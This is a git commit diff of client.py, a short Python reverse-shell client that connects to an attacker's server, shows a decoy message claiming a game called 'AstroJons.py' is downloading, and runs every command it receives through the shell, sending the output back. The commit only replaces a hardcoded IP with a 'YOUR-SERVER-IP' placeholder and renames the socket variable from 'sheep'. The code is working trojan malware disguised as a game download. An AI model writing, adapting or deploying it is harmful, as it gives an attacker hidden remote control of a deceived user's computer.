00681db1e7e1d36c8fdde532e88000d4fc7cf7f7
zeta <matteefiori@gmail.com>
2025-05-28 16:46:32 +0200

    client.py

--- client.py
+++ client.py
@@ -1,51 +1,43 @@
 import socket as sk
 import subprocess as sp
 
-HOST = "192.168.0.7"
+HOST = "YOUR-SERVER-IP"
 PORT = 9090
 ADDR = (HOST, PORT)
 FORMAT = "utf-8"
 
-sheep = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
-sheep.connect(ADDR)
+client = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
+client.connect(ADDR)
 
 CONNECTED = True
 
-print("[ THE GAME ( 'AstroJons.py' ) IS DOWNLOADING...] - [ PLEASE WAIT, IT WILL TAKE SOME TIME : ) ]")
+print("[ THE GAME ( 'AstroJons.py' ) IS DOWNLOADING...][ PLEASE WAIT, IT WILL TAKE SOME TIME : ) ]")
 
 while CONNECTED:
 
     try:
         
-        cmd = sheep.recv(4096).decode(FORMAT)
+        cmd = client.recv(4096).decode(FORMAT)
 
         if cmd == "!QUIT":
             
             CONNECTED = False
-            sheep.close()
+            client.close()
             break
         
-        
         if cmd.strip() == "":
-           
             continue
 
-        
         result = sp.run(cmd, shell=True, capture_output=True, text=True)
 
-        
         output = result.stdout + result.stderr
 
-        
         if output == "":
             output = "[No output returned]\n"
 
-        
-        sheep.send(output.encode(FORMAT))
+        client.send(output.encode(FORMAT))
 
     except Exception as e:
-    
-       
         CONNECTED = False
-        sheep.close()
+        client.close()
         break
